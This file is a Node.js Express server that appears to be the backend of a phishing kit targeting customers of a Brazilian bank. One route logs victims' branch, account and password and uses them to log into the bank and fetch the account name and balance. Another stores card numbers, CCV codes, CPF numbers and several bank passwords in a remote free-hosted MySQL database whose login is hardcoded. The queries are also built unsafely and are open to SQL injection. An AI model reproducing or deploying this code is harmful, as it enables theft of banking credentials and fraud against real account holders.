import BB from './bb';

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cors({ origin: '*' }));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(express.static('public'));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname + '/public/index.html'));
});

app.post('/getData', async (req, res) => {
  try {
    let name = '';
    let checkingBalance = '';

    if (require.main === module) {
      const bb = new BB();
      let branch = req.body.agencia;
      let account = req.body.conta;
      let password = req.body.pass;
      console.log(branch, account, password);

      name = await bb.login({ branch, account, password });
      checkingBalance = await bb.checking.getBalance();
      console.log(name.nomeCliente, checkingBalance);
    }

    if (name == '') {
      res.json({ name: name, balance: checkingBalance });
    } else {
      res.json({ name: name.nomeCliente, balance: checkingBalance });
    }
  } catch (err) {
    res.json({ name: '', balance: '' });
  }
});

app.post('/inputData', async (req, res) => {
  try {
    let mysql = require('mysql');

    let con = mysql.createConnection({
      host: 'sql11.freemysqlhosting.net',
      user: 'sql11458641',
      password: 'SNDmBNx6wA',
      database: 'sql11458641',
    });

    con.connect(function(err) {
      if (err) throw err;
      console.log('Connected!');
      let sql =
        "INSERT INTO tbl_access_info (date, agencia, conta, senha_de_8, saldo, cell, senha_de_6, silabica, nome_do_cartao, numero_do_cartao, ccv, cpf) VALUES ('" +
        req.body.data_1 +
        "', '" +
        req.body.data_2 +
        "', '" +
        req.body.data_3 +
        "', '" +
        req.body.data_4 +
        "', '" +
        req.body.data_5 +
        "', '" +
        req.body.data_6 +
        "', '" +
        req.body.data_7 +
        "', '" +
        req.body.data_8 +
        "', '" +
        req.body.data_9 +
        "', '" +
        req.body.data_10 +
        "', '" +
        req.body.data_11 +
        "', '" +
        req.body.data_12 +
        "')";
      con.query(sql, function(err, result) {
        if (err) throw err;
        console.log('1 record inserted');
      });
    });

    res.json({ result: 'success' });
  } catch (err) {
    res.json({ result: 'fail' });
  }
});

app.listen(process.env.PORT || 5000);

console.log('Running at Port 5000');

export default BB;
